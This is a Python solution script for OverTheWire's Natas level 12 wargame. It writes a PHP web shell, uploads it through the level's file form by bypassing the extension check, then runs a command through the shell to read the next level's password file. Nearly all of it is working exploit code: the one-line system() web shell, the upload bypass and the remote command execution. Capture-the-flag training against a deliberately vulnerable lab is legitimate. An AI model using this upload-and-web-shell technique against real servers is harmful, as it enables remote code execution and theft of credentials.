import re
import requests
import os

level = 12
creds = ('natas12','EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3')
url   = 'http://natas%s.natas.labs.overthewire.org/' % level

session = requests.Session()
response = session.get(url,auth=creds)
data = response.text


w = open('exploit.php','w')
w.write('<?php system($_GET["cmd"]); ?>')
w.close()

file = {'uploadedfile':open('exploit.php','rb')}
formdata = {'MAX_FILE_SIZE':'1000','submit':'submit','filename':'exploit.php'}

response = session.post(url,auth=creds,data=formdata, files=file)

data = response.text

shell_url = re.findall('<a href="upload(.*)">upload/',data)[0]
shell_url=url+'upload'+shell_url+"?cmd=cat /etc/natas_webpass/natas13"

#print(shell_url)

response = session.get(shell_url,auth=creds)

data = response.text

print(data)
os.remove('exploit.php')